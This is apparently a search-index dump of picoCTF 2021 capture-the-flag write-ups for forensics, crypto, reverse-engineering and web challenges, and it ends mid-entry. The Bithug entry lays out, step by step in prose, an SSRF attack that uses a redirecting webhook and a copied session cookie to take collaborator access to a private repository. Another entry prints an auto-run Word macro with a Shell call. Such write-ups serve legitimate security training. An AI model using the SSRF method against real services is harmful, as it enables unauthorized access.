could use to build up the flag.","title":"Script"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/scrambled_RSA/","text":"Scrambled RSA \u00b6 The questions provides a netcat connection and provides a ciphered flag the public modulus n and the public exponent e . The program also allows you to provide input in which it will output the encrypted form. Testing \u00b6 Credits to @ers123 I was able to find a pattern when encrypting different strings. First tried to encrypt 1 then 12 then 123 . You will see that the output of each contains the previous which means that the flag is simply composed of the flag characters encrypted but scrambled. The Method \u00b6 The method is to store the flag in a string and brute force each character of the flag. First, we send every printable character to the program and check which one is in the flag, that would be the first character. Then, we add on to that \"leaked\" flag by adding another character and by removing the previously found character(encrypted integer) we can then compare that number to the flag string. By doing this repeatedly, we end up with a flag.","title":"Scrambled RSA"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/scrambled_RSA/#scrambled-rsa","text":"The questions provides a netcat connection and provides a ciphered flag the public modulus n and the public exponent e . The program also allows you to provide input in which it will output the encrypted form.","title":"Scrambled RSA"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/scrambled_RSA/#testing","text":"Credits to @ers123 I was able to find a pattern when encrypting different strings. First tried to encrypt 1 then 12 then 123 . You will see that the output of each contains the previous which means that the flag is simply composed of the flag characters encrypted but scrambled.","title":"Testing"},{"location":"CTF%20Writeups/picoCTF%202021/Cryptography/scrambled_RSA/#the-method","text":"The method is to store the flag in a string and brute force each character of the flag. First, we send every printable character to the program and check which one is in the flag, that would be the first character. Then, we add on to that \"leaked\" flag by adding another character and by removing the previously found character(encrypted integer) we can then compare that number to the flag string. By doing this repeatedly, we end up with a flag.","title":"The Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/README%209.50.23%20PM/","text":"Forensics \u00b6 Forensics challenges from picoCTF2021. Was able to complete all challenges.","title":"Forensics"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/README%209.50.23%20PM/#forensics","text":"Forensics challenges from picoCTF2021. Was able to complete all challenges.","title":"Forensics"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/cat/","text":"Cat \u00b6 This challenge gives us an image. By enumerating through regular forensics techniques such as strings , hexdump , exiftool etc. we are able to see that there are some metadata that has been modified. Method \u00b6 By running exiftool and focusing on the metadata again, we see that the XMP licence is custom and has a name of picoCTF . Looking at it's licence, we can identify a base 64 encoded string which will be our flag.","title":"Cat"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/cat/#cat","text":"This challenge gives us an image. By enumerating through regular forensics techniques such as strings , hexdump , exiftool etc. we are able to see that there are some metadata that has been modified.","title":"Cat"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/cat/#method","text":"By running exiftool and focusing on the metadata again, we see that the XMP licence is custom and has a name of picoCTF . Looking at it's licence, we can identify a base 64 encoded string which will be our flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/disk_disk_sleuth/","text":"Disk Disk Sleuth \u00b6 Was able to solve the challenge by using Sleuthkit and searching for the string picoCTF Disk Disk Sleuth II \u00b6 Same method as above by using the graphical interface of Sleuthkit and searching through the filesystem.","title":"Disk Disk Sleuth"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/disk_disk_sleuth/#disk-disk-sleuth","text":"Was able to solve the challenge by using Sleuthkit and searching for the string picoCTF","title":"Disk Disk Sleuth"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/disk_disk_sleuth/#disk-disk-sleuth-ii","text":"Same method as above by using the graphical interface of Sleuthkit and searching through the filesystem.","title":"Disk Disk Sleuth II"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/macrohard_weakedge/","text":"Microsoft Weekedge \u00b6 Given a Microsoft Power-point file. Tried regular enumeration techniques like strings , opening the file and looking for templates, macros etc. After some research, realized that PPT files are just archives and could be unziped to see inner content. Method \u00b6 Unzipped the .ppt file and looked through folders and files found a file called hidden . Inside was base64 encoded flag.","title":"Microsoft Weekedge"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/macrohard_weakedge/#microsoft-weekedge","text":"Given a Microsoft Power-point file. Tried regular enumeration techniques like strings , opening the file and looking for templates, macros etc. After some research, realized that PPT files are just archives and could be unziped to see inner content.","title":"Microsoft Weekedge"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/macrohard_weakedge/#method","text":"Unzipped the .ppt file and looked through folders and files found a file called hidden . Inside was base64 encoded flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/milk_slap/","text":"Milk Slap \u00b6 Downloaded file and tried to split it into individual frames, but that was a dead end. Method \u00b6 Used stego-toolkit and ran automatic enumeration on the original image. Was able to get flag.","title":"Milk Slap"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/milk_slap/#milk-slap","text":"Downloaded file and tried to split it into individual frames, but that was a dead end.","title":"Milk Slap"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/milk_slap/#method","text":"Used stego-toolkit and ran automatic enumeration on the original image. Was able to get flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/pixelated/","text":"Pixelated \u00b6 Looking at the two images hints towards some sort of operation between them that will show the fag. To do so, I used stegsolve.jar and used the image overlay function. Method \u00b6 By overlaying one image over another and cycling the overlay mode through stegsolve, was able to see flag.","title":"Pixelated"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/pixelated/#pixelated","text":"Looking at the two images hints towards some sort of operation between them that will show the fag. To do so, I used stegsolve.jar and used the image overlay function.","title":"Pixelated"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/pixelated/#method","text":"By overlaying one image over another and cycling the overlay mode through stegsolve, was able to see flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/surfing_the_waves/","text":"Surfing the Waves \u00b6 Credits to @ZeroDayTea Looking at the sound signal in audacity or any visualization software and we can visually see that the amplitudes are in some sort of pattern. Method \u00b6 By using scripy.io we are able to read the WAV file in and collect all the amplitudes. If we check those value we can see they all lie within printable ASCII hex code. Thus, by converting all the unique points/peaks, we are able to recover the flag.","title":"Surfing the Waves"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/surfing_the_waves/#surfing-the-waves","text":"Credits to @ZeroDayTea Looking at the sound signal in audacity or any visualization software and we can visually see that the amplitudes are in some sort of pattern.","title":"Surfing the Waves"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/surfing_the_waves/#method","text":"By using scripy.io we are able to read the WAV file in and collect all the amplitudes. If we check those value we can see they all lie within printable ASCII hex code. Thus, by converting all the unique points/peaks, we are able to recover the flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/trivial_flag_transfer_protocol/","text":"Trivial Flag Transfer Protocol \u00b6 Looking at the name of the challenge, it's probably sending data using TFTP . We import the .pcap into wireshark and see that indeed, there is TFTP traffic going on. Method \u00b6 We can extract objects using wireshark and if we select TFTP, we see that wireshark detected a couple of files. instructions , plan , program and 3 pictures. Running file on the program file shows us it's a .deb file and it's installing steghide . This means that the flag is hidden in the images using steghide The plan and instructions didn't look like anything but after a while I realized that it's just a cipher. Passing it through a online cracker or in my case, the caesar command from the command line did the job. We recovered the passphrase for the steghide all we need to do is extract the data.","title":"Trivial Flag Transfer Protocol"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/trivial_flag_transfer_protocol/#trivial-flag-transfer-protocol","text":"Looking at the name of the challenge, it's probably sending data using TFTP . We import the .pcap into wireshark and see that indeed, there is TFTP traffic going on.","title":"Trivial Flag Transfer Protocol"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/trivial_flag_transfer_protocol/#method","text":"We can extract objects using wireshark and if we select TFTP, we see that wireshark detected a couple of files. instructions , plan , program and 3 pictures. Running file on the program file shows us it's a .deb file and it's installing steghide . This means that the flag is hidden in the images using steghide The plan and instructions didn't look like anything but after a while I realized that it's just a cipher. Passing it through a online cracker or in my case, the caesar command from the command line did the job. We recovered the passphrase for the steghide all we need to do is extract the data.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/tunn3l_v1s10n/","text":"Tunnel Vision \u00b6 The challenge gave us an file. Running file on it shows that it's a bmg image but it's corrupted so we cannot open it. This is probably due to corrupt or wrong headers. Method \u00b6 Following the wikipedia file format specifications for bmp I was able to recover after fixing the header size and the The number of color planes metadata to recover the file.","title":"Tunnel Vision"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/tunn3l_v1s10n/#tunnel-vision","text":"The challenge gave us an file. Running file on it shows that it's a bmg image but it's corrupted so we cannot open it. This is probably due to corrupt or wrong headers.","title":"Tunnel Vision"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/tunn3l_v1s10n/#method","text":"Following the wikipedia file format specifications for bmp I was able to recover after fixing the header size and the The number of color planes metadata to recover the file.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/very_very_hidden/","text":"Very Very Hidden \u00b6 Credit goes to @ZeroDayTea Given a .pcapng we were able to recover a several http files. We find two duck images. Intuition \u00b6 Looking at the traffic, we see a lot of references to powershell so after extensive research, a tool called Extract-PSImage was found and it could extract powershell scripts from images. Method \u00b6 By running the tool on the evil_duck image we were able to recover a script that will output the flag.","title":"Very Very Hidden"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/very_very_hidden/#very-very-hidden","text":"Credit goes to @ZeroDayTea Given a .pcapng we were able to recover a several http files. We find two duck images.","title":"Very Very Hidden"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/very_very_hidden/#intuition","text":"Looking at the traffic, we see a lot of references to powershell so after extensive research, a tool called Extract-PSImage was found and it could extract powershell scripts from images.","title":"Intuition"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/very_very_hidden/#method","text":"By running the tool on the evil_duck image we were able to recover a script that will output the flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/weird_file/","text":"Weird File \u00b6 So this is something to do with MSWord macros Heres the macros in the file ```vbscript= Sub AutoOpen() MsgBox \"Macros can run any program\", 0, \"Title\" Signature End Sub Sub Signature() Selection.TypeText Text:=\"some text\" Selection.TypeParagraph End Sub Sub runpython() Dim Ret_Val Args = \"\"\"\" '\"\"\" Ret_Val = Shell(\"python -c 'print(\\\"cGljb0NURnttNGNyMHNfcl9kNG5nM3IwdXN9\\\")'\" & \" \" & Args, vbNormalFocus) If Ret_Val = 0 Then MsgBox \"Couldn't run python script!\", vbOKOnly End If End Sub The `runpython()` is sus # Flag Yup the print in the python script is just base64 encoded. picoCTF{m4cr0s_r_d4ng3r0us} ```","title":"Weird File"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/weird_file/#weird-file","text":"So this is something to do with MSWord macros Heres the macros in the file ```vbscript= Sub AutoOpen() MsgBox \"Macros can run any program\", 0, \"Title\" Signature End Sub Sub Signature() Selection.TypeText Text:=\"some text\" Selection.TypeParagraph End Sub Sub runpython() Dim Ret_Val Args = \"\"\"\" '\"\"\" Ret_Val = Shell(\"python -c 'print(\\\"cGljb0NURnttNGNyMHNfcl9kNG5nM3IwdXN9\\\")'\" & \" \" & Args, vbNormalFocus) If Ret_Val = 0 Then MsgBox \"Couldn't run python script!\", vbOKOnly End If End Sub The `runpython()` is sus # Flag Yup the print in the python script is just base64 encoded. picoCTF{m4cr0s_r_d4ng3r0us} ```","title":"Weird File"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/wireshark_doo/","text":"Wireshark Doo \u00b6 Credits to @baozi Basically used an online pcap analyzer for the file. Flag hidden in plaintext. It was picoCTF{p33kab00_1_s33_u_deadbeef}","title":"Wireshark Doo"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/wireshark_doo/#wireshark-doo","text":"Credits to @baozi Basically used an online pcap analyzer for the file. Flag hidden in plaintext. It was picoCTF{p33kab00_1_s33_u_deadbeef}","title":"Wireshark Doo"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/wireshark_two/","text":"Wireshark Two \u00b6 Given a .pcapng file. Open it in wireshark and we see a lot of traffic. Intuition \u00b6 Looking at the packets, a lot of them had flag like strings in them such as picoCTF{a97d3ee943221888bd1157429e4a00ed5e9905a610e64664f7e36c7f5e0a4ef9} which was a distraction. Then I saw that there were also a lot of DNS quires to weird destinations involving red shrimp and herring . Method \u00b6 Taking a deeper look at these DNS records, we see that it's all going to similar domains but the subdomain part is random characters that looks like base 64 . I tried to capture some of them but a lot was gibberish. A further look revealed that only some DNS records are pointing to a different destination IP and by using wireshark filters, I was able to filter them out. By concatenating the subdomain name and decoding using b64 was able to recover flag.","title":"Wireshark Two"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/wireshark_two/#wireshark-two","text":"Given a .pcapng file. Open it in wireshark and we see a lot of traffic.","title":"Wireshark Two"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/wireshark_two/#intuition","text":"Looking at the packets, a lot of them had flag like strings in them such as picoCTF{a97d3ee943221888bd1157429e4a00ed5e9905a610e64664f7e36c7f5e0a4ef9} which was a distraction. Then I saw that there were also a lot of DNS quires to weird destinations involving red shrimp and herring .","title":"Intuition"},{"location":"CTF%20Writeups/picoCTF%202021/Forensics/wireshark_two/#method","text":"Taking a deeper look at these DNS records, we see that it's all going to similar domains but the subdomain part is random characters that looks like base 64 . I tried to capture some of them but a lot was gibberish. A further look revealed that only some DNS records are pointing to a different destination IP and by using wireshark filters, I was able to filter them out. By concatenating the subdomain name and decoding using b64 was able to recover flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/README%209.52.45%20PM/","text":"Basic \u00b6 Basic linux shell skills and fundamentals.","title":"Basic"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/README%209.52.45%20PM/#basic","text":"Basic linux shell skills and fundamentals.","title":"Basic"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/nice_netcat/","text":"Nice Netcat \u00b6 This is quite a simple challenge, given a netcat connection we can see that the connection prints out many numbers. Looking at these numbers we can see that they all fall in the decimal representation of ASCII printable characters and true enough, the first couple numbers correspond to pic which is the flag format. Script \u00b6 We could potentially manually take these numbers and convert them into ASCII but we could also use pwntools to automate this process. To do so, I received all the output from the connection and split it by new line characters and used the python chr function to convert integers so it's ASCII representation.","title":"Nice Netcat"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/nice_netcat/#nice-netcat","text":"This is quite a simple challenge, given a netcat connection we can see that the connection prints out many numbers. Looking at these numbers we can see that they all fall in the decimal representation of ASCII printable characters and true enough, the first couple numbers correspond to pic which is the flag format.","title":"Nice Netcat"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/nice_netcat/#script","text":"We could potentially manually take these numbers and convert them into ASCII but we could also use pwntools to automate this process. To do so, I received all the output from the connection and split it by new line characters and used the python chr function to convert integers so it's ASCII representation.","title":"Script"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/python_wrangling/","text":"Python Wrangling \u00b6 This challenge is quite straightforward as well. We just need to follow the help instructions and point the arguments towards the password and encrypted flag.","title":"Python Wrangling"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/python_wrangling/#python-wrangling","text":"This challenge is quite straightforward as well. We just need to follow the help instructions and point the arguments towards the password and encrypted flag.","title":"Python Wrangling"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/static_noise/","text":"Static Noise \u00b6 This is a very simple challenge. All we need to do is pass the static binary file to to provided disassembler. First, we mark the ltdis.sh script as executable then we pass in the static file as arg[0] Strings \u00b6 We could also run strings on the binary and both ways, we get a list of printable strings in the binary and the flag could be found there.","title":"Static Noise"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/static_noise/#static-noise","text":"This is a very simple challenge. All we need to do is pass the static binary file to to provided disassembler. First, we mark the ltdis.sh script as executable then we pass in the static file as arg[0]","title":"Static Noise"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/static_noise/#strings","text":"We could also run strings on the binary and both ways, we get a list of printable strings in the binary and the flag could be found there.","title":"Strings"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/tab_attack/","text":"Tab Attack \u00b6 This is a challenge where the flag file is deep in the file tree. Based on the name, we could easily use tab autocomplete to change directory but we could also use cd * because there is only 1 directory in each parent directory. In the end, we could just cat out the file and the flag will be present.","title":"Tab Attack"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/tab_attack/#tab-attack","text":"This is a challenge where the flag file is deep in the file tree. Based on the name, we could easily use tab autocomplete to change directory but we could also use cd * because there is only 1 directory in each parent directory. In the end, we could just cat out the file and the flag will be present.","title":"Tab Attack"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/wave_a_flag/","text":"Wave a Flag \u00b6 We receive a binary for this challenge and we mark it executable. Following the directions, we run the binary with the -h flag which prints out the flag. We could also run strings on the binary and grep for pico like so: strings warm | grep pico","title":"Wave a Flag"},{"location":"CTF%20Writeups/picoCTF%202021/General%20Skills/wave_a_flag/#wave-a-flag","text":"We receive a binary for this challenge and we mark it executable. Following the directions, we run the binary with the -h flag which prints out the flag. We could also run strings on the binary and grep for pico like so: strings warm | grep pico","title":"Wave a Flag"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_1/","text":"ARMAssembly 1 \u00b6 By going over the code, we are able to see that it simply runs an (x << y) // z on the input data.","title":"ARMAssembly 1"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_1/#armassembly-1","text":"By going over the code, we are able to see that it simply runs an (x << y) // z on the input data.","title":"ARMAssembly 1"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/","text":"ARMAssembly 2-4 \u00b6 Run in native linux system (WSL wont work) Install dependencies \u00b6 sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential Compile \u00b6 aarch64-linux-gnu-gcc -static -o chall_1 chall_1.S Run \u00b6 ./chall_1 <argument> ARSM 2 \u00b6 3736234946 ARSM 3 \u00b6 1048110976 ARSM 4 \u00b6 3251372985","title":"ARMAssembly 2-4"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/#armassembly-2-4","text":"Run in native linux system (WSL wont work)","title":"ARMAssembly 2-4"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/#install-dependencies","text":"sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential","title":"Install dependencies"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/#compile","text":"aarch64-linux-gnu-gcc -static -o chall_1 chall_1.S","title":"Compile"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/#run","text":"./chall_1 <argument>","title":"Run"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/#arsm-2","text":"3736234946","title":"ARSM 2"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/#arsm-3","text":"1048110976","title":"ARSM 3"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMsembly_2-4/#arsm-4","text":"3251372985","title":"ARSM 4"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMssembly_0/","text":"ARMssembly 0 \u00b6 This program compares the two inputs and outputs the larger input.","title":"ARMssembly 0"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/ARMssembly_0/#armssembly-0","text":"This program compares the two inputs and outputs the larger input.","title":"ARMssembly 0"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/README%209.53.08%20PM/","text":"","title":"README 9.53.08 PM"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/check_pass/","text":"","title":"Check pass"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/crackme_py/","text":"","title":"Crackme py"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/easy_as_gdb/","text":"","title":"Easy as gdb"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/gogo/","text":"gogo procedure Load it into binary ninja and we see that there are two byte arrays of length 32 bytes that are XORed with each other to give us the password One of them is referred elsewhere. This gives you password 1 Then, the program will execute another function and you need to convert the byte array to ascii It is a MD5 hash and cracking the hash will give you the second password. Enter both of them one by one when prompted and you get the flag.","title":"Gogo"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/hurry_up_wait/","text":"","title":"Hurry up wait"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/keygenme_py/","text":"Keygenme-py \u00b6 check_key() function hashlib . sha256 ( username_trial ) . hexdigest () = 92d7ac3c9a0cf9d527a5906540d6c59c80bf8d7ad5bb1885f5f79b5b24a6d387 mapping hash[] = [4,5,3,6,2,7,1,8] key[] = [23,24,25,26,27,28,29,30]","title":"Keygenme-py"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/keygenme_py/#keygenme-py","text":"check_key() function hashlib . sha256 ( username_trial ) . hexdigest () = 92d7ac3c9a0cf9d527a5906540d6c59c80bf8d7ad5bb1885f5f79b5b24a6d387 mapping hash[] = [4,5,3,6,2,7,1,8] key[] = [23,24,25,26,27,28,29,30]","title":"Keygenme-py"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/lets_get_dynamic/","text":"","title":"Lets get dynamic"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/powershelly/","text":"","title":"Powershelly"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/shop/","text":"","title":"Shop"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/speeds_and_feeds/","text":"Speeds and feeds \u00b6 Partial flag \u00b6 picoCTF{num3r1cal_c0ntr0l_a067637b}","title":"Speeds and feeds"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/speeds_and_feeds/#speeds-and-feeds","text":"","title":"Speeds and feeds"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/speeds_and_feeds/#partial-flag","text":"picoCTF{num3r1cal_c0ntr0l_a067637b}","title":"Partial flag"},{"location":"CTF%20Writeups/picoCTF%202021/Reverse%20Engineering/transformation/","text":"","title":"Transformation"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/README%209.53.22%20PM/","text":"Web Challenges \u00b6 Web challenges from picoCTF 2021. Was able to complete all challenges.","title":"Web Challenges"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/README%209.53.22%20PM/#web-challenges","text":"Web challenges from picoCTF 2021. Was able to complete all challenges.","title":"Web Challenges"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/ancient_history/","text":"Ancient History \u00b6 The js variable _0x24f7 outputs the following JS array 526768ZtfrvX Hello World! 78163aRzYSF 457jWohGf 3gwbXxs 240229GBlwom 164587EeZQxF 157219qCggfo 5sPeoBz 223cFkxrK 2333MZMsti log 1pWuugQ 564uktHRc I suspect that this is URL path names but I cant seem to access any. Prettfied JS \u00b6 window.history.pushState() Method \u00b6 Turns out after discovering the pushState() function, I realized that the JS pushes a lot of states to the user DOM. We can use window.history.back() to go back in the history tree and recover the flag. Flag \u00b6 picoCTF{th4ts_k1nd4_n34t_3bed1170}","title":"Ancient History"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/ancient_history/#ancient-history","text":"The js variable _0x24f7 outputs the following JS array 526768ZtfrvX Hello World! 78163aRzYSF 457jWohGf 3gwbXxs 240229GBlwom 164587EeZQxF 157219qCggfo 5sPeoBz 223cFkxrK 2333MZMsti log 1pWuugQ 564uktHRc I suspect that this is URL path names but I cant seem to access any.","title":"Ancient History"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/ancient_history/#prettfied-js","text":"window.history.pushState()","title":"Prettfied JS"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/ancient_history/#method","text":"Turns out after discovering the pushState() function, I realized that the JS pushes a lot of states to the user DOM. We can use window.history.back() to go back in the history tree and recover the flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/ancient_history/#flag","text":"picoCTF{th4ts_k1nd4_n34t_3bed1170}","title":"Flag"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/","text":"Bithug \u00b6 You probably noticed that code treats you as admin if you access it internally (127.0.0.1) which means SSRF There is a feature for WebHooks which can help you with that. You need to send a request internally to _/ .git to make you a collaborator Figure out what is the payload that makes a user collaborator of a repository (use wire shark to capture git push) Make sure you follow all instructions on \"user\" tab of repository on how to add collaborator Get the payload in binary and get the content type needed The payload must be base64 of binary stream use curl to create a webhook with custom payload and contentType The url for the webhook is annoying as it filters out ports and localhost. Create a custom web server that does 307 redirect to 127.0.0.1/_/user.git/x-git... Add the webhook using curl Do a random push request to trigger webhook magicccc Step1: Intuition \u00b6 Request from 127.0.0.1 are treated as admin and hence have access to all apis That means if we can make the server send a request to itself (SSRF) we can get it do whatever we want There is a features called webhooks, which makes a post request to said url with said body when you trigger it by doing git push The webhook is created using api, it needs to values: body and contentType The url for webhook is filtered, you cannot enter localhost ip or ports. But you need to send request to 127.0.0.1:1823/ to make it work Anyhow, there is an intended way to add collaborator, create a repo go to \"users\" you'll see instructions to add user as collaborator (need to follow exact instructions) Step2: Plan \u00b6 The flag is hidden in a secret repo at _/username.git The plan is to add yourself as contributor to that repo so you can access it See how collaborator is added to a sample repo and mimic the request using webhook You will need exact payload that's sent to the server when you push the collaborator addition commit Step3: Getting the Payload \u00b6 You'll need Wireshark create a repo randomly on instance git clone that repo locally follow instructions to add collaborator but don't push it yet Turn on capture for wireshark git push You'll notice a post request to instance with content-type: x-git...... Also remember path to which it pushes Copy the contentType to a file (to remember) Copy the payload as escaped string, Wireshark will give you copy of all request so you'll need to do some cleaning here. Once copied look for a patter \"\\x30\\x30\" from which the real payload starts, also check wireshark data tab Clean the payload format it'll have line break, create a single string thats like \"\\x30\\x30....................\" convert the byte stream payload from above to base64 That will be your payload Step4: Figuring out URL \u00b6 As mentioned you cannot have 127.0.0.1:1823 as URL for webhook due to filters Create a webserver using flask or php and host it online the server should do a 307 redirect to http://127.0.0.1:1823/_/username.got/git-packet..... (you saw this path in wireshark) Use the url of your webserver for webhook Step5: Adding webhook \u00b6 You can't directly add it because we need a special contentType that is like /x-git...... copy user-token cookie for we will send cURL request with it find the url of webhooks api (user chrome devtools to see the request when you create a dummy webhook) create a curl request with user-token cookie so your authorized and your payload should be in same structure as you noticed with dummy i. e {url: , body: , contentType} For url use your URL that you have created, body is your base64 string you created and contentType is what you copied from wireshark that looks like /git-packet something Step6: Magicccccc \u00b6 Now you have set the trap, Time to trigger it clone the repo for which you have added the webhook create a random commit like adding \"# 69\" to readme git push Step7: THE FLAG \u00b6 Go to instanceURL/_/username.git Note: When I means .git i mean your username like admin.git, applies to all places I mentioned it.","title":"Bithug"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#bithug","text":"You probably noticed that code treats you as admin if you access it internally (127.0.0.1) which means SSRF There is a feature for WebHooks which can help you with that. You need to send a request internally to _/ .git to make you a collaborator Figure out what is the payload that makes a user collaborator of a repository (use wire shark to capture git push) Make sure you follow all instructions on \"user\" tab of repository on how to add collaborator Get the payload in binary and get the content type needed The payload must be base64 of binary stream use curl to create a webhook with custom payload and contentType The url for the webhook is annoying as it filters out ports and localhost. Create a custom web server that does 307 redirect to 127.0.0.1/_/user.git/x-git... Add the webhook using curl Do a random push request to trigger webhook magicccc","title":"Bithug"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#step1-intuition","text":"Request from 127.0.0.1 are treated as admin and hence have access to all apis That means if we can make the server send a request to itself (SSRF) we can get it do whatever we want There is a features called webhooks, which makes a post request to said url with said body when you trigger it by doing git push The webhook is created using api, it needs to values: body and contentType The url for webhook is filtered, you cannot enter localhost ip or ports. But you need to send request to 127.0.0.1:1823/ to make it work Anyhow, there is an intended way to add collaborator, create a repo go to \"users\" you'll see instructions to add user as collaborator (need to follow exact instructions)","title":"Step1: Intuition"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#step2-plan","text":"The flag is hidden in a secret repo at _/username.git The plan is to add yourself as contributor to that repo so you can access it See how collaborator is added to a sample repo and mimic the request using webhook You will need exact payload that's sent to the server when you push the collaborator addition commit","title":"Step2: Plan"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#step3-getting-the-payload","text":"You'll need Wireshark create a repo randomly on instance git clone that repo locally follow instructions to add collaborator but don't push it yet Turn on capture for wireshark git push You'll notice a post request to instance with content-type: x-git...... Also remember path to which it pushes Copy the contentType to a file (to remember) Copy the payload as escaped string, Wireshark will give you copy of all request so you'll need to do some cleaning here. Once copied look for a patter \"\\x30\\x30\" from which the real payload starts, also check wireshark data tab Clean the payload format it'll have line break, create a single string thats like \"\\x30\\x30....................\" convert the byte stream payload from above to base64 That will be your payload","title":"Step3: Getting the Payload"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#step4-figuring-out-url","text":"As mentioned you cannot have 127.0.0.1:1823 as URL for webhook due to filters Create a webserver using flask or php and host it online the server should do a 307 redirect to http://127.0.0.1:1823/_/username.got/git-packet..... (you saw this path in wireshark) Use the url of your webserver for webhook","title":"Step4: Figuring out URL"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#step5-adding-webhook","text":"You can't directly add it because we need a special contentType that is like /x-git...... copy user-token cookie for we will send cURL request with it find the url of webhooks api (user chrome devtools to see the request when 